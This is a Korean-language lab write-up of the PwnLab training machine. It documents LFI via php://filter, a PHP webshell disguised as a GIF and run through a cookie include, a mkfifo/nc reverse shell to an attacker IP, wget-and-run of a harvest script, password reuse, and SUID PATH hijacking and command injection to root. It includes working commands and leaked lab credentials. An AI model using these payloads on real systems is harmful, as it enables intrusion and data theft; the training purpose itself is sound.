---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/web/file-upload
  - tech/db/mysql
  - tech/cred/reuse
  - tech/lin/suid
  - tech/lin/path-hijack
  - tech/rce/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.29
ports: [80, 111, 3306, 50118]
services: [http, mysql, rpcbind, status]
status: solved
manual_tags: true
tech_count: 8
---

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 초고의 터미널 블록 일부가 **실제 pty 캡처와 다르게 정리돼 있었다.** 명령을 붙이고 자르고, 프롬프트를
> 다시 그리고, 한 명령의 출력을 두 블록으로 쪼갠 흔적이다. 값(플래그·해시·비밀번호·IP)은 전부 정확했고,
> 틀린 것은 **어떤 명령이 언제 어느 프롬프트에서 실행됐는가**다. 아래는 `~/PG/PwnLab/` 원문으로 되돌렸다.
>
> | 위치 | 초고가 적은 것 | 원문 |
> |---|---|---|
> | 3 리버스셸 | `$ python -c "import pty;..."` 가 한 줄로 찍힘 | `sh` 가 에코를 안 해 캡처에는 `$ www-data@pwnlab:...$` 만 있다. 명령은 코드펜스 밖으로 뺐다 |
> | 4-2 su 블록 | `Password: (JWzXuBJJNy)` | 캡처에는 `Password: ` 만 있고 비번은 안 찍힌다. 값은 주석으로 뺐다 |
> | 4-2 kent | `kent@pwnlab:/tmp$ id` | 실제는 `id; ls -la ~` — kent 홈 목록이 같이 나왔고 그게 "비었다"의 근거다 |
> | 4-2 kane | `... /home/john` | 실제는 `... /home/john 2>&1` — `2>&1` 이 있어야 `Permission denied` 가 같이 보인다 |
> | 4-3 | `kane@pwnlab:/tmp$ /home/kane/msgmike` | 그런 단독 실행은 없다. `strings ...; echo ===; ...; /home/kane/msgmike` 한 줄이었다 |
> | 4-3 | **`kane@pwnlab:/tmp$ id`** → uid=1002 | 하이재킹 성공 뒤 프롬프트는 **`mike@pwnlab:/tmp$`** 다. 초고는 노트 자신의 주장과 모순됐다 |
> | 4-4 | `mike@pwnlab:/tmp$ ls -la /home/mike` | 별도 실행이 아니라 위 `id; ls -la /home/mike` 의 뒷부분이다 |
> | 4-4 | `root@pwnlab:/tmp# id` → uid=0 | `id` 단독 실행은 없었다. 실제 명령은 `whoami; id; ...; ls -la /root; cat /root/proof.txt` |
> | 6장 (4) | `... date; cat /root/proof.txt` | 실제 명령에는 `; echo ---; cat /root/flag.txt` 가 더 붙어 있었고 **그게 안 찍힌 것이 핵심 단서**였다 |
> | 6장 (4) | `echo "PATH=$PATH"` 와 PATH 복원이 별도 블록 | 한 줄이었다. 쪼개면 "PATH 를 보고 나서 고쳤다"는 서사가 되는데 실제로는 한 번에 쳤다 |
> | 6장 (3) | `...` 로 줄인 명령 2개 | 전문으로 되돌렸고, 초고가 빠뜨린 **중간 시도 한 번**(따옴표 분리 우회)을 추가했다 |
>
> 그밖에 정밀화한 것 — `/tmp` 의 `nosuid` 설명이 "마운트가 `/dev/sda1` 하나뿐"으로 읽혔는데, 실제로는
> **`/tmp` 항목이 없어서** `/` 옵션을 물려받는 것이다(가상 파일시스템 마운트는 여럿 있고 그쪽은 다 `nosuid`).
> 6장 (3)에는 초고가 빠뜨린 **중간 실패 한 번**을, (5)로는 SUID 열거 함정을 재현 가능한 `diff` 형태로 추가했다.
>
> 감사에서 **재실행으로 확인해 그대로 둔 것**: `curl -F` 가 `.gif` 에 `Content-Type: image/gif` 를 자동으로
> 넣는다는 것, `bash -p` 유무에 따른 EUID(각각 1000 / 0)는 Kali 에서 다시 재봐 같은 값이 나왔다.
> SUID 목록 www-data↔root 차이, `sudo` 미설치, `exim4 4.84.2-1` 도 산출물과 일치한다.

> [!info] PwnLab
> 192.168.248.29 · Debian 8 jessie (32비트) · Fundamental · 플래그 2개
> `?page=php://filter` 로 소스 → MySQL 평문 크리덴셜 → 로그인 → GIF 위장 업로드 →
> `Cookie: lang=../upload/*.gif` 로 include → www-data → 비번 재사용으로 kane →
> SUID `msgmike` PATH 하이재킹으로 mike → SUID `msg2root` 커맨드 인젝션으로 root

## 0. 이 박스에서 배우는 것

- **같은 앱에 LFI 진입점이 두 개**다. 하나(`?page=`)는 `.php` 가 강제로 붙어 소스 읽기에만 쓸 수 있고, 다른 하나(`Cookie: lang=`)는 확장자가 안 붙어 임의 파일 실행에 쓸 수 있다. **한쪽을 찾았다고 만족하고 멈추면 셸까지 못 간다.**
- `php://filter/convert.base64-encode/resource=` 로 PHP 소스를 그대로 빼내는 법
- getimagesize + 확장자 화이트리스트 + Content-Type 3중 검사를 **전부 만족시키면서** PHP 를 심는 법
- DB 에 저장된 비밀번호가 **OS 계정에 그대로 재사용**되는 패턴 — su 로 옆걸음
- 절대경로를 안 쓴 SUID 바이너리 → PATH 하이재킹
- `system("/bin/echo %s >> ...")` 형태의 SUID 바이너리 → 세미콜론 하나로 커맨드 인젝션

**시험 출제 가능성** — 높다. LFI→업로드→include 체인은 OSCP 웹 파트의 정석이고, `strings` 로 SUID 바이너리를 열어 상대경로/`system()` 을 찾는 것은 리눅스 권한상승의 기본 반사다. 변형이라면 include 진입점이 쿠키가 아니라 `Accept-Language` 헤더나 세션 파일(`/var/lib/php5/sessions/sess_*`)로 바뀌는 정도.

## 1. 정찰

### Nmap

```
# Nmap 7.98 scan initiated Thu Aug 20 17:47:24 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.29
Nmap scan report for 192.168.248.29
Host is up (0.084s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33696/udp6  status
|   100024  1          41404/tcp6  status
|   100024  1          45351/udp   status
|_  100024  1          50118/tcp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 42
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsTransactions, LongColumnFlag, Speaks41ProtocolOld, SupportsCompression, LongPassword, FoundRows, IgnoreSigpipes, Speaks41ProtocolNew, ODBCClient, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ]l(#q5Rz3-(}aK7pP|An
|_  Auth Plugin Name: mysql_native_password
50118/tcp open  status  1 (RPC #100024)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 4 hops

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   83.55 ms 192.168.45.1
2   83.51 ms 192.168.45.254
3   83.61 ms 192.168.251.1
4   83.86 ms 192.168.248.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 17:47:56 2026 -- 1 IP address (1 host up) scanned in 32.17 seconds
```

읽을 줄은 셋이다. **22 가 없다** — 셸을 잡아도 SSH 로 갈아탈 수 없고, 사용자 전환은 전부 `su` 로 해야 한다. **3306 이 외부에 열려 있다** — 웹에서 크리덴셜만 얻으면 DB 를 Kali 에서 직접 붙을 수 있다는 뜻이고, 실제로 그게 지름길이었다. **111/50118 은 rpcbind + rpc.statd** 뿐이고 NFS 는 안 뜬다(`/etc/exports` 도 비어 있었다). `mount.nfs` 가 SUID 로 있어서 잠깐 눈길이 갔지만 export 가 없으니 경로가 아니다.

UDP 도 상위 50포트만 훑었다. 111/udp 하나뿐이라 여기서 더 볼 것이 없었다.

```
PORT     STATE  SERVICE
111/udp  open   rpcbind
135/udp  closed msrpc
1646/udp closed radacct
1900/udp closed upnp
2049/udp closed nfs
```

### 웹

![[PG-PwnLab-home.png]]

`[ Home ] [ Login ] [ Upload ]` 세 링크가 전부고 각각 `?page=login`, `?page=upload` 다. 로그인 폼과 업로드는 이렇게 생겼다.

![[PG-PwnLab-login.png]]

업로드 페이지는 로그인 전에는 `You must be log in.` 만 뱉는다.

![[PG-PwnLab-upload-denied.png]]

`?page=<이름>` 이 파일명을 그대로 받는 구조로 보이므로 여기부터 판다. 디렉터리 브루트포싱은 하지 않았다 — 파라미터 자체가 이미 파일을 가리키고 있어서 그쪽이 훨씬 빠른 길이었다.

## 2. 취약점 분석

### 2-1. `?page=` — 확장자가 강제되는 LFI

`php://filter` 래퍼로 소스를 base64 로 받아낸다.

```
curl -s 'http://192.168.248.29/index.php?page=php://filter/convert.base64-encode/resource=config'
```

리소스 이름에 `.php` 를 **안 붙인 것이 요점**이다. 아래 index.php 를 보면 include 직전에 `.".php"` 가 붙기 때문에, `resource=config` 라고 써야 최종적으로 `resource=config.php` 가 된다.

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```

여기서 두 가지가 동시에 보인다.

1. `include($_GET['page'].".php")` — `.php` 가 강제로 붙는다. `?page=/tmp/x.gif` 는 `/tmp/x.gif.php` 를 찾으므로 실패한다. 널바이트로 자르는 건 PHP 5.6 에서 안 된다(이 박스는 PHP 5.6.17). 즉 **이 진입점은 소스 읽기 전용**이다.
2. `include("lang/".$_COOKIE['lang'])` — **확장자가 안 붙는다.** 주석이 `Not implemented yet` 이라 개발자가 잊어버린 코드처럼 보이지만 include 는 실제로 실행된다. **여기가 진짜 실행 경로다.**

`config.php` 부터 뽑는다.

```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

`login.php` 도 뽑아봤는데 SQLi 는 없다. prepared statement 를 제대로 쓴다.

```php
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);
```

대신 **비밀번호를 base64 로 "저장"** 한다. 해시가 아니라 인코딩이므로 DB 를 읽으면 평문이 그대로 나온다.

> [!tip] RFI 는 왜 안 되는가 — 이 박스에서 실제로 때려봤다
> `?page=http://192.168.45.207:8000/rfitest` 를 던졌더니 include 자리에 아무것도 안 나오고,
> **우리 HTTP 서버 로그에 요청 자체가 찍히지 않았다.** PHP 가 URL 을 fetch 하기도 전에 거절한다는 뜻이다.
> 타겟에서 확인한 값도 일치한다 — `allow_url_fopen => On`, `allow_url_include => Off`.
> `allow_url_fopen` 이 On 이라 `file_get_contents` 는 URL 을 읽지만, `include` 는 별도 스위치가 막는다.
> 그래서 `data://` 나 `http://` 로 한 방에 끝내는 길은 이 박스에 없고, **파일을 먼저 올려야** 한다.

### 2-2. 업로드 검사 세 겹

```php
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
```

세 검사가 각각 무엇을 보는지 갈라서 봐야 우회가 보인다.

| 검사 | 보는 것 | 우회 |
|---|---|---|
| `strrchr($filename,'.')` 화이트리스트 | **파일명의 마지막 점 이후** | 파일명을 `sh.gif` 로 |
| `strpos($filetype,'image')` | **클라이언트가 보낸 Content-Type** | 우리가 정하는 값이라 그냥 `image/gif` |
| `getimagesize()['mime']` | **파일 내용의 매직바이트** | 앞에 GIF 헤더를 붙임 |

PHP 인터프리터는 파일 앞쪽 쓰레기를 무시하고 `<?php` 부터 실행하므로, **GIF 헤더 + PHP 태그**면 세 검사를 전부 통과하면서 실행도 된다. 확장자가 `.gif` 로 남는 것은 문제가 안 된다 — Apache 는 `.gif` 를 PHP 로 실행하지 않지만, 우리는 **직접 요청하는 게 아니라 include 로 읽힐 것**이기 때문이다. `include` 는 확장자를 보지 않는다.

저장 이름이 `md5(basename(원래이름))` 이라 경로를 예측할 수 있다. 응답에도 `<img src="upload/...">` 로 그대로 돌려준다.

## 3. Foothold

### DB 에서 비밀번호 꺼내기

3306 이 외부에 열려 있으므로 Kali 에서 바로 붙는다.

```
┌──(kali㉿kali)-[~/PG/PwnLab]
└─$ mysql --skip-ssl -h 192.168.248.29 -u root -p'H4u%QJ_H99' -e 'show databases; use Users; show tables; select * from users;'
Database
information_schema
Users
Tables_in_Users
users
user	pass
kent	Sld6WHVCSkpOeQ==
mike	U0lmZHNURW42SQ==
kane	aVN2NVltMkdSbw==
```

`--skip-ssl` 이 없으면 Kali 의 MariaDB 클라이언트가 `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it` 로 죽는다(6장 참고).

```
Sld6WHVCSkpOeQ== -> JWzXuBJJNy
U0lmZHNURW42SQ== -> SIfdsTEn6I
aVN2NVltMkdSbw== -> iSv5Ym2GRo
```

DB 를 못 붙는 상황이었다면 `?page=php://filter/...resource=config` 로 얻은 크리덴셜을 그대로 쓸 데가 없었을 것이다. 그때는 LFI 로 `/var/lib/mysql` 을 읽거나, 로그인 폼에 대해 위 세 비밀번호를 시도했을 것이다.

### 로그인 → 업로드

```
┌──(kali㉿kali)-[~/PG/PwnLab]
└─$ printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff' > sh.gif
└─$ echo '<?php system($_REQUEST["c"]); ?>' >> sh.gif
└─$ xxd sh.gif | head -3
00000000: 4749 4638 3961 0100 0100 8000 0000 0000  GIF89a..........
00000010: ffff ff3c 3f70 6870 2073 7973 7465 6d28  ...<?php system(
00000020: 245f 5245 5155 4553 545b 2263 225d 293b  $_REQUEST["c"]);
```

`GIF89a` 뒤의 바이트는 논리 화면 기술자(가로 1, 세로 1, 색상 정보)다. `getimagesize()` 가 크기를 읽어야 하므로 `GIF89a;` 만 붙이는 것보다 이쪽이 안전하다.

```
└─$ curl -s -c cookies.txt -d 'user=kent&pass=JWzXuBJJNy&submit=Login' 'http://192.168.248.29/index.php?page=login' -i | head -12
HTTP/1.1 302 Found
Date: Thu, 20 Aug 2026 08:38:44 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=8a228r4sf2muih5e37huv72r16; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: ?page=upload
Content-Length: 265
Content-Type: text/html; charset=UTF-8
```

`302` + `Location: ?page=upload` 가 로그인 성공 신호다. 실패하면 200 에 `Login failed.` 가 찍힌다.

```
└─$ curl -s -b cookies.txt -F 'file=@sh.gif;type=image/gif' -F 'submit=Upload' 'http://192.168.248.29/index.php?page=upload' | grep -o 'upload/[a-f0-9]*\.gif'
upload/63f0276ffd69eb424bf6093795ac9850.gif
```

`-F 'file=@sh.gif;type=image/gif'` 의 `;type=` 이 파트의 Content-Type 을 지정하는 부분이다. 타겟이 아니라 Kali 의 로컬 리스너(`nc`)에 같은 요청을 던져 확인했다 — `;type=` 을 빼도 curl 이 확장자를 보고 `Content-Type: image/gif` 를 스스로 채운다. 아래는 nc 가 받은 요청에서 `Content-Type` 두 줄만 뽑은 것이다(바깥은 multipart 전체, 안쪽이 파트별).

```
┌──(kali㉿kali)-[~/PG/PwnLab]
└─$ curl -s -m 3 -F 'file=@sh.gif' http://127.0.0.1:9099/     # nc 로 받아서 grep
Content-Type: multipart/form-data; boundary=------------------------PPRLaIYrEwIPNwrz95E4JB
Content-Type: image/gif
```

즉 이 박스에서는 `;type=` 이 없어도 통과했을 것이다. 하지만 확장자를 `.php` 로 두면서 Content-Type 만 `image/*` 로 속이는 상황에서는 명시가 필수라 습관으로 붙여두는 편이 낫다.

### include 로 실행

```
└─$ curl -s -i -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' --get --data-urlencode 'c=id; uname -a; ls -la /home' 'http://192.168.248.29/'
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 08:39:05 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 785
Content-Type: text/html; charset=UTF-8

GIF89a^A^@^A^@M-^@^@^@^@^@^@M-^?M-^?M-^?uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
total 24
drwxr-xr-x  6 root root 4096 Mar 17  2016 .
drwxr-xr-x 21 root root 4096 Feb 20  2020 ..
drwxr-x---  2 john john 4096 Mar  3  2020 john
drwxr-x---  2 kane kane 4096 Jul 22  2020 kane
drwxr-x---  2 kent kent 4096 Mar  3  2020 kent
drwxr-x---  2 mike mike 4096 Mar  3  2020 mike
<html>^M
```

`../` 는 include 가 `lang/` 을 앞에 붙이기 때문에 필요하다 — `lang/../upload/...` 로 웹루트로 되돌아온다. 응답 맨 앞에 `GIF89a` 매직바이트가 그대로 찍히는 게 우리가 심은 파일이 실행됐다는 증거다. `--data-urlencode` 는 명령에 들어간 공백·세미콜론이 URL 에서 깨지지 않게 한다.

### 리버스셸

**웹셸로 읽은 플래그는 OSCP 에서 0점**이므로 여기서 바로 대화형 셸로 갈아탄다. 리스너는 tmux 안에 둔다.

```
└─$ ssh kali@10.44.44.128 "tmux new-session -d -s pwnlab_shell 'rlwrap nc -lvnp 443 2>&1 | tee ~/PG/PwnLab/shell_www-data.log; exec bash'"
└─$ curl -s -m 10 -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' \
     --get --data-urlencode 'c=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 443 >/tmp/f' \
     'http://192.168.248.29/'
```

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.29] 43985
/bin/sh: 0: can't access tty; job control turned off
$ www-data@pwnlab:/var/www/html$ cd /tmp && wget -q http://192.168.45.207:8000/harvest.sh -O /tmp/h.sh && echo GOT && sh /tmp/h.sh; echo DONE
GOT
수집 완료: /tmp/.h/harvest.txt
889 /tmp/.h/harvest.txt
DONE
```

443 아웃바운드가 첫 시도에 통과했다. `-m 10` 은 curl 이 셸 프로세스를 붙든 채 무한 대기하지 않게 하는 안전장치다.

`$ ` 다음에 곧바로 `www-data@pwnlab:...$` 가 붙어 있는 건, 그 자리에서 `python -c "import pty;pty.spawn('/bin/bash')"` 를 보냈는데 **`sh` 가 입력을 에코하지 않아** 명령 자체는 캡처에 안 남고 프롬프트 변화만 남았기 때문이다. `can't access tty` 상태에서는 `su` 가 비밀번호를 못 읽으므로, pty 를 먼저 올려두는 것이 4-2의 전제가 된다(정확한 거부 문구는 확인하지 않았다).

## 4. 권한상승

### 4-1. www-data 시점의 열거 — 그리고 그 한계

셸 직후 `harvest.sh` 를 돌렸다(19섹션, 889행). 읽을 부분만 옮긴다.

```
===== SUDO =====
/tmp/h.sh: 30: /tmp/h.sh: sudo: not found
(sudo -n 실패 — 비밀번호 필요하거나 sudo 없음)
```

`sudo` 가 **아예 설치돼 있지 않다**(`which sudo` 도 빈손이었다). Debian 8 최소 설치의 기본 상태다. `sudo -l` 이 첫 수인 습관 때문에 여기서 잠깐 멈칫하게 되는데, 없는 것도 정보다 — sudo 경로는 접어도 된다.

```
===== SUID =====
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
```

전부 배포판 기본이다. **커스텀 SUID 가 하나도 없어 보인다.** 그런데 나중에 root 로 같은 `harvest.sh` 를 돌리면 목록이 다르다.

```
===== SUID =====
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
/home/mike/msg2root
/home/kane/msgmike
...
```

> [!danger] `find / -perm -4000` 은 "내가 들어갈 수 있는 디렉터리" 안에서만 참이다
> `/home/*` 이 전부 `drwxr-x---` 라 www-data 는 디렉터리를 열 수 없고, 그래서 그 안의 SUID 바이너리가
> **에러 없이 그냥 목록에서 빠진다**(`find` 의 `Permission denied` 는 `2>/dev/null` 로 버려진다).
> **커스텀 SUID 가 안 보인다 = 없다** 가 아니다. 사용자 계정으로 옆걸음한 뒤 **같은 열거를 다시 돌려라.**
> 이 박스는 그 차이가 곧 권한상승 경로 전체였다.

`/tmp` 관련해서 하나 더 나왔다.

```
lrwxrwxrwx 1 root     root        5 Mar 17  2016 /var/www/html/upload -> /tmp/
```

업로드 디렉터리가 `/tmp` 심볼릭 링크다. 그래서 아까 올린 gif 가 `/tmp/63f0...gif` 로 떨어져 있었다.

### 4-2. www-data → kane (비밀번호 재사용)

DB 에서 꺼낸 세 비밀번호를 `su` 로 시도한다. SSH 가 닫혀 있으니 셸 안에서 해야 하고, `su` 는 TTY 를 요구하므로 앞에서 pty 를 붙여둔 것이 여기서 필요해진다.

```
www-data@pwnlab:/tmp$ su kent
Password: 
kent@pwnlab:/tmp$ id; ls -la ~
uid=1001(kent) gid=1001(kent) groups=1001(kent)
total 20
drwxr-x--- 2 kent kent 4096 Mar  3  2020 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw------- 1 kent kent    0 Mar  3  2020 .bash_history
-rw-r--r-- 1 kent kent  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kent kent 3515 Mar 17  2016 .bashrc
-rw-r--r-- 1 kent kent  675 Mar 17  2016 .profile
```

`su` 는 비밀번호를 에코하지 않으므로 캡처의 `Password: ` 뒤는 비어 있다. 넣은 값은 `JWzXuBJJNy` 다.

kent 홈은 dotfile 넷뿐이다 — `.bash_history` 도 0바이트. 막다른 길이라 kane 으로 옮긴다(`iSv5Ym2GRo`).

```
kent@pwnlab:/tmp$ su kane
Password: 
kane@pwnlab:/tmp$ id; ls -la /home/kane /home/mike /home/john 2>&1
uid=1003(kane) gid=1003(kane) groups=1003(kane)
ls: cannot open directory /home/john: Permission denied
/home/kane:
total 32
drwxr-x--- 2 kane kane 4096 Jul 22  2020 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw------- 1 kane kane    0 Mar  3  2020 .bash_history
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
-rw-r--r-- 1 kane kane   33 Aug 20 04:23 local.txt
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
ls: cannot open directory /home/mike: Permission denied
```

`2>&1` 을 붙인 이유는 `ls` 가 못 읽는 디렉터리를 stderr 로 뱉기 때문이다. 캡처를 파일로 리다이렉트해 두면 `2>&1` 없이는 `Permission denied` 가 통째로 사라져서, 나중에 **"mike 홈을 봤는데 비어 있었다"** 로 잘못 기억하게 된다. 여기서는 그 줄이 곧 "아직 mike 가 아니다"라는 정보다.

`local.txt` 와 `msgmike`(SUID mike) 가 같이 나온다. mike 의 DB 비밀번호 `SIfdsTEn6I` 는 시스템 계정에서는 안 통했고, 대신 이 바이너리가 mike 로 가는 통로다.

### 4-3. kane → mike (PATH 하이재킹)

먼저 바이너리를 통째로 훑고 그대로 한 번 실행해봤다. 아래는 `strings` 출력에서 읽을 부분만 남긴 것이고, `===` 뒤가 실행 결과다.

```
kane@pwnlab:/tmp$ strings /home/kane/msgmike; echo ===; ./ /home/kane/msgmike 2>/dev/null; /home/kane/msgmike
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setregid
setreuid
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh 
QVh[
[^_]
cat /home/mike/msg.txt
;*2$"(
GCC: (Debian 4.9.2-10) 4.9.2
...
===
cat: /home/mike/msg.txt: No such file or directory
kane@pwnlab:/tmp$ strings /home/kane/msgmike | grep -i cat
cat /home/mike/msg.txt
```

(`./ /home/kane/msgmike` 는 오타다. `2>/dev/null` 로 죽어서 아무것도 안 남았고, 뒤에 붙인 두 번째 호출이 실제 실행이다.)

`system` 과 `setreuid` 가 심볼 목록에 함께 있고, 문자열은 `cat /home/mike/msg.txt` — `cat` 을 **절대경로 없이** 부른다. PATH 를 앞에서 가로채면 mike 권한으로 아무 프로그램이나 돌릴 수 있다.

```
kane@pwnlab:/tmp$ set +H
kane@pwnlab:/tmp$ mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; /bin/cat /tmp/.pth/cat
#!/bin/bash
exec /bin/bash -p
kane@pwnlab:/tmp$ PATH=/tmp/.pth:$PATH /home/kane/msgmike
mike@pwnlab:/tmp$ id; ls -la /home/mike
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
total 28
drwxr-x--- 2 mike mike 4096 Mar  3  2020 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 root root    0 Mar  3  2020 .bash_history
-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile
```

`msgmike` 를 실행한 직후 **프롬프트가 `kane@` 에서 `mike@` 로 바뀐 것**이 성공 신호다. 그리고 조금 전 `Permission denied` 로 막혔던 `/home/mike` 가 바로 열리면서 `msg2root`(SUID **root**) 가 나온다. 계정을 얻으면 곧바로 같은 열거를 다시 돌리라는 말이 이거다.

`id` 가 `uid=1002` 로 나온다 — euid 뿐 아니라 **real uid 까지 바뀌었다.** 바이너리가 `setreuid` 를 먼저 호출하기 때문이다. 덕분에 bash 가 권한을 떨어뜨리지 않는다.

> [!warning] 가짜 인터프리터 스크립트는 `#!/bin/sh` 로 쓰지 마라
> 여기서는 SUID 바이너리가 real uid 를 이미 바꿔놓아서 `#!/bin/bash` 든 `-p` 든 상관없이 통했다.
> 하지만 **SUID 파일을 직접 실행하는** 형태였다면 dash 가 euid 를 버리고 조용히 실패한다.
> 습관적으로 `bash -p` 나 C 로 쓰는 편이 안전하다. `/tmp` 가 `nosuid` 로 마운트된 경우도 있으니
> `mount` 출력을 먼저 본다. 이 박스에서 실제 디스크 마운트는 `/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)`
> 하나고 **`/tmp` 항목 자체가 없다** — 즉 `/` 의 옵션을 그대로 물려받아 `nosuid` 가 아니다.
> (`harvest_root.txt` 의 `MOUNTS` 섹션. 나머지는 전부 sysfs·proc·cgroup 류 가상 파일시스템이고 그쪽은 다 `nosuid` 다.)

`set +H` 를 **별도 줄로** 먼저 보낸 이유는 6장에 적었다.

### 4-4. mike → root (SUID 바이너리 커맨드 인젝션)

`msg2root` 는 소유자가 root 인 SUID(4-3의 목록)다. 같은 반사를 한 번 더 — 먼저 `strings`.

```
mike@pwnlab:/tmp$ strings /home/mike/msg2root | head -30
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
stdin
fgets
asprintf
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Message for root: 
/bin/echo %s >> /root/messages.txt
;*2$"(
GCC: (Debian 4.9.2-10) 4.9.2
```

읽을 심볼이 넷이다 — `fgets` 로 stdin 을 받고, `asprintf` 로 포맷 문자열에 끼워 넣고, `system` 으로 실행한다. 포맷은 `/bin/echo %s >> /root/messages.txt`.

`/bin/echo` 는 절대경로라 PATH 하이재킹이 안 통한다. 대신 **사용자 입력이 그대로 포맷에 끼워져 `system()` 에 넘어간다.** 세미콜론으로 문장을 끊으면 그 뒤는 root 권한 셸에서 실행된다.

```
mike@pwnlab:/tmp$ /home/mike/msg2root
Message for root: hi; /bin/bash -p
hi
bash-4.3# id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```

`hi` 가 먼저 출력되는 건 `/bin/echo hi` 가 정상 실행됐기 때문이다. **`-p` 는 필수다** — 여기서는 real uid 가 mike 로 남아 있어서(`setreuid` 를 안 부르는 바이너리다) `-p` 없는 bash 는 euid 를 real uid 로 되돌린다.

